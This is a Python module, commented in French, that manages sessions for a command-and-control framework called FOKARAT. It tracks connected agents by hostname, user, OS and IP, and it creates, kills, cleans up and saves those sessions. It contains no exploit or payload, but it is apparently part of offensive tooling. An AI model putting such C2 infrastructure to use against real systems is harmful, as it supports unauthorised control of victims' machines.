"""
FOKARAT - Gestionnaire de sessions C2
Suivi des agents connectés, reprise, logs.
"""
import os
import json
import time
import threading
from datetime import datetime

from core.logger import Logger

logger = Logger()


class Session:
    """Représente une session C2 active."""

    def __init__(self, session_id, agent_info, crypto):
        self.id = session_id
        self.agent_info = agent_info  # dict (hostname, username, os, ip, etc.)
        self.crypto = crypto
        self.created_at = time.time()
        self.last_seen = time.time()
        self.alive = True
        self.commands_history = []
        self.lock = threading.Lock()

    def to_dict(self):
        return {
            "id": self.id,
            "hostname": self.agent_info.get("hostname", "?"),
            "username": self.agent_info.get("username", "?"),
            "os": self.agent_info.get("os", "?"),
            "ip": self.agent_info.get("ip", "?"),
            "created_at": datetime.fromtimestamp(self.created_at).isoformat(),
            "last_seen": datetime.fromtimestamp(self.last_seen).isoformat(),
            "alive": self.alive,
            "commands_count": len(self.commands_history),
        }


class SessionManager:
    """Gère toutes les sessions C2."""

    SESSIONS_FILE = "output/c2_sessions.json"

    def __init__(self):
        self.sessions = {}  # id -> Session
        self.lock = threading.Lock()
        os.makedirs("output", exist_ok=True)

    def create_session(self, agent_info, crypto) -> Session:
        """Crée une nouvelle session."""
        import secrets
        session_id = secrets.token_hex(8)
        session = Session(session_id, agent_info, crypto)
        with self.lock:
            self.sessions[session_id] = session
        logger.success(f"Nouvelle session C2 : {session_id} ({agent_info.get('hostname', '?')})")
        self._save()
        return session

    def get_session(self, session_id) -> Session:
        return self.sessions.get(session_id)

    def list_sessions(self) -> list:
        with self.lock:
            return [s.to_dict() for s in self.sessions.values()]

    def kill_session(self, session_id):
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].alive = False
                logger.info(f"Session {session_id} terminée")
                self._save()

    def cleanup_dead(self, timeout=300):
        """Supprime les sessions mortes (> timeout sans contact)."""
        now = time.time()
        with self.lock:
            dead = [sid for sid, s in self.sessions.items()
                    if not s.alive or (now - s.last_seen) > timeout]
            for sid in dead:
                del self.sessions[sid]
        if dead:
            logger.info(f"{len(dead)} session(s) nettoyée(s)")

    def _save(self):
        try:
            data = {sid: s.to_dict() for sid, s in self.sessions.items()}
            with open(self.SESSIONS_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.warning(f"Erreur sauvegarde sessions : {e}")


session_manager = SessionManager()